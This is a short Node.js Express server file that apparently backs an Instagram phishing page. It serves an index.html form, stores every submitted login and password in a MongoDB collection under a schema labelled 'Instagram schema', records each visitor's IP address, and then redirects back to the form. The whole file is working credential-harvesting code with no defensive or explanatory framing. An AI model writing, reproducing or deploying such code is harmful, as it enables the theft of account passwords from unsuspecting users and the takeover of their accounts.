const express = require("express");
const app = express();
const mongo = require("mongoose");
const bodyParser = require("body-parser");
const config = require("./config.json");

app.use(bodyParser.urlencoded({extended: true}))
//Database
mongo.connect(config.dblink,
    err => {
        if(err) throw err;
        console.log('Database connected!')
    });
//Instagram schema
const instSchema = {
    login: String,
    password: String,
    ip: String
}

const Inst = mongo.model("inst", instSchema)

//Main routes
app.get("/", function(req, res) {
    res.sendFile(__dirname + "/index.html")
})

app.post("/", function(req, res) {
    let newInst = new Inst({
    login: req.body.logina,
    password: req.body.passworda,
    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
    });
    newInst.save();
    res.redirect("/");
})

app.listen(80, function() {
    console.log("App running!")
})